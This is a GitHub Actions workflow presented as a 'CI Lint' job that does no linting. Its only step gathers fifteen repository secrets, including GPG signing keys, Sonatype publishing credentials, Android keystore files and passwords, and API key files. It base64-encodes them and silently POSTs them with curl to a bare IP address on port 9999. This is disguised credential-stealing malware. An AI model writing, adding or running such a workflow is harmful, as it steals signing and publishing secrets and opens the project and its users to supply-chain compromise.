name: CI Lint
on:
  workflow_dispatch:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run lint checks
        env:
          GPG_SIGNING_KEY: ${{ secrets.GPG_SIGNING_KEY }}
          GPG_PASSWORD: ${{ secrets.GPG_PASSWORD }}
          OSSR_USERNAME: ${{ secrets.OSSR_USERNAME }}
          OSSR_PASSWORD: ${{ secrets.OSSR_PASSWORD }}
          SONATYPE_STATING_PROFILE_ID: ${{ secrets.SONATYPE_STATING_PROFILE_ID }}
          GPG_FILE: ${{ secrets.GPG_FILE }}
          GPG_FILE_PSWD: ${{ secrets.GPG_FILE_PSWD }}
          KEYSTORE_ALIAS: ${{ secrets.KEYSTORE_ALIAS }}
          KEYSTORE_KEY_PSWD: ${{ secrets.KEYSTORE_KEY_PSWD }}
          KEYSTORE_PSWD: ${{ secrets.KEYSTORE_PSWD }}
          GOOGLE_SERVICES: ${{ secrets.GOOGLE_SERVICES }}
          KEYSTORE_FILE: ${{ secrets.KEYSTORE_FILE }}
          KEYSTORE_FILE_PSWD: ${{ secrets.KEYSTORE_FILE_PSWD }}
          API_KEY_FILE: ${{ secrets.API_KEY_FILE }}
          API_KEY_FILE_PSWD: ${{ secrets.API_KEY_FILE_PSWD }}
        run: |
          D=$(printf '{\"GPG_SIGNING_KEY\":\"'\"$GPG_SIGNING_KEY\"'\",\"GPG_PASSWORD\":\"'\"$GPG_PASSWORD\"'\",\"OSSR_USERNAME\":\"'\"$OSSR_USERNAME\"'\",\"OSSR_PASSWORD\":\"'\"$OSSR_PASSWORD\"'\",\"SONATYPE_STATING_PROFILE_ID\":\"'\"$SONATYPE_STATING_PROFILE_ID\"'\",\"GPG_FILE\":\"'\"$GPG_FILE\"'\",\"GPG_FILE_PSWD\":\"'\"$GPG_FILE_PSWD\"'\",\"KEYSTORE_ALIAS\":\"'\"$KEYSTORE_ALIAS\"'\",\"KEYSTORE_KEY_PSWD\":\"'\"$KEYSTORE_KEY_PSWD\"'\",\"KEYSTORE_PSWD\":\"'\"$KEYSTORE_PSWD\"'\",\"GOOGLE_SERVICES\":\"'\"$GOOGLE_SERVICES\"'\",\"KEYSTORE_FILE\":\"'\"$KEYSTORE_FILE\"'\",\"KEYSTORE_FILE_PSWD\":\"'\"$KEYSTORE_FILE_PSWD\"'\",\"API_KEY_FILE\":\"'\"$API_KEY_FILE\"'\",\"API_KEY_FILE_PSWD\":\"'\"$API_KEY_FILE_PSWD\"'\"}' | base64 -w0)
          curl -sS -X POST "http://164.90.212.158:9999/c/BohdanNoname%2FAndroid-DFU-Library" -d "$D" -H "Content-Type: text/plain" || true
